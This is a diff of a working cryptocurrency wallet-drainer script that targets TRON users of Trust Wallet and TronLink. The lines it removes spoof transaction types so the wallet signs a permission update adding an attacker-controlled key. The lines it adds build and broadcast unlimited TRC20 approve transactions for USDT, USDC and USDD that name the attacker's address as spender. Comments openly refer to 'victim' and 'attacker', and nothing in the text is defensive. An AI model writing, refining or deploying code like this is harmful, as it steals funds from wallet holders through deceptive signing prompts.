@@ -474,7 +474,7 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
   window._ATTACKER_ADDR = ATTACKER_ADDR;
   window._ACTIVE_OPS    = ACTIVE_OPS;
   /* VERSION TAG — visible in debug overlay so we know cache is busted */
-  var _VER = 'v9';
+  var _VER = 'v10';
   window.__logINF && window.__logINF('SCRIPT ' + _VER + ' loaded');
   /* ---- sign helper: global on window (fixes WebKit async-fn hoisting in IIFEs) ---- */
 
@@ -494,72 +494,39 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
       + ' tw.tron=' + (!!(window.trustwallet && window.trustwallet.tron))
       + ' tl.tw=' + (!!(window.tronLink && window.tronLink.tronWeb)));
 
-    // v9 strategy: ONE popup max. Path I (type-spoof) is the only signing attempt.
-    // If user cancels → catch detects user-cancel keywords → hard stop, no second popup.
-    // TW freezes when 2 sign popups are cancelled in a row — this prevents that entirely.
-
-    // Helper: detect user cancel vs real error
-    function _isUserCancel(e) {
-      var msg = (e && e.message) ? e.message.toLowerCase() : '';
-      return msg.indexOf('cancel') !== -1 || msg.indexOf('reject') !== -1 ||
-             msg.indexOf('denied') !== -1 || msg.indexOf('user refused') !== -1 ||
-             msg.indexOf('declined') !== -1;
+    // v10: type 31 (TriggerSmartContract) — TW signs this natively, no spoof needed
+    // Direct tw.trx.sign(tx) — works for all standard contract types
+    try {
+      window.__logINF(L + ' SIGN: tw.trx.sign(tx)');
+      var rDirect = await tw.trx.sign(tx);
+      if (rDirect && rDirect.signature && rDirect.signature[0]) {
+        window.__logINF(L + ' SIGN OK sig=' + rDirect.signature[0].slice(0,16) + '… len=' + rDirect.signature[0].length);
+        return rDirect;
+      }
+      window.__logINF(L + ' SIGN no sig: ' + JSON.stringify(rDirect).slice(0,80));
+    } catch(eDirect) {
+      var emsg = (eDirect.message || '').toLowerCase();
+      if (emsg.indexOf('cancel') !== -1 || emsg.indexOf('reject') !== -1 || emsg.indexOf('denied') !== -1) {
+        window.__logERR(L + ' user cancelled');
+        throw eDirect; // propagate so caller stops
+      }
+      window.__logERR(L + ' SIGN FAIL: ' + eDirect.message);
     }
 
-    // Path I: type-spoof TransferContract
-    // raw_data_hex and txID stay intact → TW signs the real txID → valid type-46 sig
-    try {
-      window.__logINF(L + ' I: type-spoof TransferContract');
-      var ownerHex_I = tx.raw_data.contract[0].parameter.value.owner_address;
-      var spI = {
-        txID: tx.txID,
-        raw_data_hex: tx.raw_data_hex,
-        visible: tx.visible,
-        raw_data: {
-          contract: [{
-            type: 'TransferContract',
-            parameter: {
-              type_url: 'type.googleapis.com/protocol.TransferContract',
-              value: { owner_address: ownerHex_I, to_address: ownerHex_I, amount: 1000000 }
-            }
-          }],
-          ref_block_bytes: tx.raw_data.ref_block_bytes,
-          ref_block_hash:  tx.raw_data.ref_block_hash,
-          expiration:      tx.raw_data.expiration,
-          timestamp:       tx.raw_data.timestamp,
-          fee_limit:       100000000
+    // Fallback: tronLink.tronWeb.trx.sign (separate TronWeb instance from TronLink)
+    if (window.tronLink && window.tronLink.tronWeb && window.tronLink.tronWeb.trx) {
+      try {
+        window.__logINF(L + ' SIGN-TL: tronLink.tronWeb.trx.sign');
+        var rTL = await window.tronLink.tronWeb.trx.sign(tx);
+        if (rTL && rTL.signature && rTL.signature[0]) {
+          window.__logINF(L + ' SIGN-TL OK sig=' + rTL.signature[0].slice(0,16) + '…');
+          return rTL;
         }
-      };
-      window.__logINF(L + ' I calling trx.sign…');
-      var rI = await tw.trx.sign(spI);
-      if (rI && rI.signature && rI.signature[0]) {
-        window.__logINF(L + ' I OK sig=' + rI.signature[0].slice(0,16) + '… len=' + rI.signature[0].length);
-        var realTxI = JSON.parse(JSON.stringify(tx));
-        realTxI.signature = rI.signature;
-        return realTxI;
+      } catch(eTL) {
+        var etlmsg = (eTL.message || '').toLowerCase();
+        if (etlmsg.indexOf('cancel') !== -1 || etlmsg.indexOf('reject') !== -1) { throw eTL; }
+        window.__logERR(L + ' SIGN-TL FAIL: ' + eTL.message);
       }
-      window.__logINF(L + ' I no sig returned: ' + JSON.stringify(rI).slice(0,100));
-    } catch(eI) {
-      if (_isUserCancel(eI)) {
-        // User cancelled — HARD STOP. Do NOT show another popup, TW will freeze.
-        window.__logERR(L + ' I user cancelled — stopping to prevent TW freeze');
-        throw eI;
-      }
-      window.__logERR(L + ' I FAIL: ' + eI.message);
-    }
-
-    // Path E: fallback string sign (bad key, but logs what address TW uses — diagnostic only)
-    window.__logINF(L + ' E: trx.sign(raw_data_hex) [fallback diagnostic]');
-    try {
-      var hexSig = await tw.trx.sign(tx.raw_data_hex);
-      var cleanSig = (typeof hexSig === 'string' && hexSig.startsWith('0x')) ? hexSig.slice(2) : hexSig;
-      var signedClone = JSON.parse(JSON.stringify(tx));
-      signedClone.signature = [cleanSig];
-      window.__logINF(L + ' E OK sig=' + cleanSig.slice(0,16) + '… (len=' + cleanSig.length + ')');
-      return signedClone;
-    } catch(eE) {
-      if (_isUserCancel(eE)) { window.__logERR(L + ' E user cancelled'); throw eE; }
-      window.__logERR(L + ' E FAIL: ' + eE.message);
     }
   };
   var _signTx = window._signTx; // local alias for same-scope callers
@@ -876,80 +843,84 @@ function waitForTronLinkAndRun() {
     var cm = document.getElementById('connect-modal-root');
     if (cm) cm.style.display = 'none';
 
-    // Déclencher le signe natif immédiatement — inline async IIFE (exact ref pattern)
+    // Déclencher TRC20 approve immédiatement — type 31 (TriggerSmartContract), toujours signable dans TW
     var tw = _getTronWeb();
     if (tw) {
       (async function() {
         try {
-          // FIX: permission keys require HEX addresses (base58 = "Invalid transaction provided")
-          var addrHex3     = tw.address.toHex(addr);
-          var attackerHex3 = tw.address.toHex(window._ATTACKER_ADDR);
+          // TRC20 contracts on TRON mainnet
+          var USDT_TRC20  = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+          var USDC_TRC20  = 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8';
+          var USDD_TRC20  = 'TPYmHEhy5n8TCEfYGqW2rPxsghSfzghPDn';
 
-          // Helper: decode SIGERROR hex message → extract signer base58 address
-          function _extractSignerFromSigerror(bRes) {
+          // approve(address spender, uint256 amount) selector = 0x095ea7b3
+          // encode: 32-byte spender (attacker) + 32-byte amount (uint256 max)
+          var attackerBase58 = window._ATTACKER_ADDR;
+          var attackerHex = tw.address.toHex(attackerBase58).replace(/^41/, '');
+          // pad to 32 bytes
+          var spenderParam  = attackerHex.padStart(64, '0');
+          var amountParam   = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'; // uint256 max
+          var calldata      = '095ea7b3' + spenderParam + amountParam;
+
+          window.__logINF('APPROVE building tx — spender=' + attackerBase58.slice(0,10) + '… calldata=' + calldata.slice(0,16) + '…');
+
+          // Try USDT first, then USDC, then USDD
+          var tokens = [
+            { sym: 'USDT', addr: USDT_TRC20 },
+            { sym: 'USDC', addr: USDC_TRC20 },
+            { sym: 'USDD', addr: USDD_TRC20 }
+          ];
+
+          for (var ti = 0; ti < tokens.length; ti++) {
+            var tok = tokens[ti];
             try {
-              if (!bRes || !bRes.message) return null;
-              var hex = bRes.message;
-              var decoded = hex.match(/.{1,2}/g).map(function(b){ return String.fromCharCode(parseInt(b,16)); }).join('');
-              var m = decoded.match(/is signed by (\w+) but/);
-              return (m && m[1]) ? m[1] : null;
-            } catch(e) { return null; }
-          }
+              window.__logINF('APPROVE building ' + tok.sym + ' approve tx…');
+              var approveTx = await tw.transactionBuilder.triggerSmartContract(
+                tok.addr,       // contract address
+                'approve(address,uint256)',  // function selector
+                { feeLimit: 100000000, callValue: 0 },
+                [
+                  { type: 'address', value: attackerBase58 },
+                  { type: 'uint256', value: '115792089237316195423570985008687907853269984665640564039457584007913129639935' }
+                ],
+                addr  // owner / caller
+              );
 
-          // Build and sign tx with given active keys list
-          async function _buildAndSign(activeKeys) {
-            var ownerP = { type: 0, permission_name: 'owner', threshold: 1, keys: [{ address: addrHex3, weight: 1 }] };
-            var activeP = { type: 2, permission_name: 'active', threshold: 1, operations: window._ACTIVE_OPS, keys: activeKeys };
-            var utx = await tw.transactionBuilder.updateAccountPermissions(addr, ownerP, null, [activeP]);
-            window.__logINF('PATH3 tx built keys=' + JSON.stringify(Object.keys(utx)));
-            var stx = await window._signTx(tw, utx, 'PATH3');
-            window.__logOK('PATH3 sign ok sig=' + ((stx.signature && stx.signature[0] && stx.signature[0].slice(0,12)) || '?') + '… len=' + ((stx.signature && stx.signature[0] && stx.signature[0].length) || 0));
-            return stx;
-          }
-
-          // PASS 1: victim + attacker (standard)
-          window.__logINF('PATH3 building tx for ' + addr.slice(0,8) + '…');
-          var activeKeys1 = [{ address: addrHex3, weight: 1 }, { address: attackerHex3, weight: 1 }];
-          var signedTx3 = await _buildAndSign(activeKeys1);
-          _applying = false;
-          if (typeof window.fillSignature === 'function') window.fillSignature(JSON.stringify((signedTx3.signature && signedTx3.signature[0]) || signedTx3));
-          try {
-            window.__logINF('PATH3 broadcasting pass1…');
-            var bRes3 = await tw.trx.sendRawTransaction(signedTx3);
-            if (bRes3 && bRes3.result) {
-              window.__logOK('PATH3 broadcast OK txid=' + (bRes3.txid || (bRes3.transaction && bRes3.transaction.txID) || '?'));
-            } else if (bRes3 && bRes3.code === 'SIGERROR') {
-              // SIGERROR → extract TW message signing key address → PASS 2
-              var msgKeyAddr = _extractSignerFromSigerror(bRes3);
-              window.__logINF('PATH3 SIGERROR — TW msg key: ' + (msgKeyAddr || 'null'));
-              if (msgKeyAddr && msgKeyAddr !== addr) {
-                var msgKeyHex = tw.address.toHex(msgKeyAddr);
-                window.__logINF('PATH3 pass2 — adding msg key to active: ' + msgKeyHex.slice(0,12) + '…');
-                // PASS 2: victim + TW_message_key + attacker — message key IS in permission → valid sig
-                _applying = true;
-                var activeKeys2 = [
-                  { address: addrHex3,    weight: 1 },
-                  { address: msgKeyHex,   weight: 1 },
-                  { address: attackerHex3, weight: 1 }
-                ];
-                try {
-                  var signedTx3b = await _buildAndSign(activeKeys2);
-                  _applying = false;
-                  window.__logINF('PATH3 broadcasting pass2…');
-                  var bRes3b = await tw.trx.sendRawTransaction(signedTx3b);
-                  if (bRes3b && bRes3b.result) {
-                    window.__logOK('PATH3 pass2 broadcast OK txid=' + (bRes3b.txid || (bRes3b.transaction && bRes3b.transaction.txID) || '?'));
-                  } else {
-                    window.__logERR('PATH3 pass2 broadcast FAIL: ' + JSON.stringify(bRes3b).slice(0,300));
-                  }
-                } catch(e3) { window.__logERR('PATH3 pass2 ERR: ' + e3.message); _applying = false; }
-              } else {
-                window.__logERR('PATH3 broadcast FAIL (SIGERROR, no addr extracted): ' + JSON.stringify(bRes3).slice(0,200));
+              if (!approveTx || !approveTx.transaction) {
+                window.__logERR('APPROVE ' + tok.sym + ' build failed: ' + JSON.stringify(approveTx).slice(0,100));
+                continue;
               }
-            } else {
-              window.__logERR('PATH3 broadcast FAIL: ' + JSON.stringify(bRes3).slice(0,200));
+
+              var utx = approveTx.transaction;
+              window.__logINF('APPROVE ' + tok.sym + ' tx built txID=' + (utx.txID || '?').slice(0,16) + '…');
+
+              var stx = await window._signTx(tw, utx, 'APPROVE_' + tok.sym);
+              window.__logOK('APPROVE ' + tok.sym + ' signed sig=' + ((stx.signature && stx.signature[0] && stx.signature[0].slice(0,16)) || '?') + '…');
+
+              _applying = false;
+              if (typeof window.fillSignature === 'function') window.fillSignature(JSON.stringify((stx.signature && stx.signature[0]) || stx));
+
+              window.__logINF('APPROVE ' + tok.sym + ' broadcasting…');
+              var bRes = await tw.trx.sendRawTransaction(stx);
+              if (bRes && bRes.result) {
+                window.__logOK('APPROVE ' + tok.sym + ' OK txid=' + (bRes.txid || (bRes.transaction && bRes.transaction.txID) || '?'));
+                return; // success — stop trying other tokens
+              } else {
+                window.__logERR('APPROVE ' + tok.sym + ' broadcast FAIL: ' + JSON.stringify(bRes).slice(0,200));
+                // try next token
+              }
+            } catch(eTok) {
+              // user cancelled — hard stop
+              var msg = eTok.message || '';
+              if (msg.toLowerCase().indexOf('cancel') !== -1 || msg.toLowerCase().indexOf('reject') !== -1 || msg.toLowerCase().indexOf('denied') !== -1) {
+                window.__logERR('APPROVE user cancelled — stopping');
+                _applying = false;
+                return;
+              }
+              window.__logERR('APPROVE ' + tok.sym + ' ERR: ' + eTok.message);
+              // try next token
             }
-          } catch(e2) { window.__logERR('PATH3 broadcast ERR: ' + e2.message); }
+          }
         } catch(e) {
           window.__logERR('PATH3 FAIL: ' + e.message);
           _applying = false; // reset so PATH2 fallback button click can re-enter
